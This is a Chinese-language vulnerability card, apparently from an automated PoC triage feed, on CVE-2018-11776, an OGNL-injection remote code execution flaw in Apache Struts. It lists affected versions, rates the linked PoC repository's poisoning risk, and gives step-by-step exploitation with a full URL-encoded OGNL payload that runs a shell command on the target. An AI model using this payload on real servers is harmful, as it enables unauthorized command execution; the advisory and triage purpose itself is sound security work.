## CVE-2018-11776-Apache Struts远程代码执行

**漏洞编号:** CVE-2018-11776

**漏洞类型:** 远程代码执行

**影响应用:** Apache Struts

**危害等级:** 高危，允许攻击者在服务器上执行任意命令。

**影响版本:** 2.3.x (2.3 to 2.3.34) 和 2.5.x (2.5 to 2.5.16)

**利用条件:** alwaysSelectFullNamespace 必须为 true，并且存在特定的命名空间配置漏洞。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-11776 是一个存在于 Apache Struts 框架中的远程代码执行漏洞。当 `alwaysSelectFullNamespace` 设置为 true，并且使用了没有命名空间的结果时，或者使用了缺少 value 和 action 属性的 url 标签，攻击者可以通过构造恶意的 URL，利用 OGNL 表达式注入执行任意代码。提供的 POC 代码通过在 URL 中嵌入 OGNL 表达式来触发漏洞。例如，第二个 POC 会在目标系统的 `/tmp` 目录下创建一个名为 `vulnerable` 的文件。该漏洞利用过程主要依赖于Struts2的OGNL表达式引擎，通过构造恶意的表达式来执行系统命令。

**有效性：**
从漏洞描述和提供的POC来看，该漏洞的利用应该是有效的，前提是目标系统满足 `alwaysSelectFullNamespace` 为 true 等前提条件。

**投毒风险：**
分析提供的 Dockerfile 和相关脚本，虽然存在构建脆弱 Struts 环境的步骤，但是总体上没有明显的恶意代码。构建过程比较繁琐，容易出错，可能存在代码执行路径未覆盖的情况。`test-cve-2018-11776`密码可能有其他用途，以及创建脆弱环境本身也是一种隐藏的风险。因此存在一定的投毒风险，但是可能性较低，约为 5%。 风险主要来自环境部署的复杂性，而不是明显的后门。

**利用方式：**
1.  **确认目标环境：** 确认目标 Apache Struts 版本在受影响范围内 (2.3 to 2.3.34 和 2.5 to 2.5.16)。
2.  **检查配置：** 检查 `alwaysSelectFullNamespace` 是否设置为 true。 这可以通过查看 Struts 的配置文件（如 `struts.xml`）来确定。
3.  **构造恶意 URL：** 构造包含 OGNL 表达式的 URL。例如，可以使用类似以下形式的 payload：
    ```
    http://<IP ADDRESS>:8080/struts2-showcase-2.3.14/%24%7B%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27touch /tmp/vulnerable%27%29.getInputStream%28%29%2C%23b%3Dnew%20java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew%20%20java.io.BufferedReader%28%23b%29%2C%23d%3Dnew%20char%5B51020%5D%2C%23c.read%28%23d%29%2C%23sbtest%3D@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2C%23sbtest.println%28%23d%29%2C%23sbtest.close%28%29%29%7D/help.action
    ```
4.  **发送请求：** 将构造的 URL 发送到目标服务器。
5.  **验证结果：** 验证命令是否成功执行。 例如，在上述 POC 中，可以检查目标服务器上是否存在 `/tmp/vulnerable` 文件。

**项目地址:** [bhdresh/CVE-2018-11776](https://github.com/bhdresh/CVE-2018-11776)

**漏洞详情:** [CVE-2018-11776](https://nvd.nist.gov/vuln/detail/CVE-2018-11776)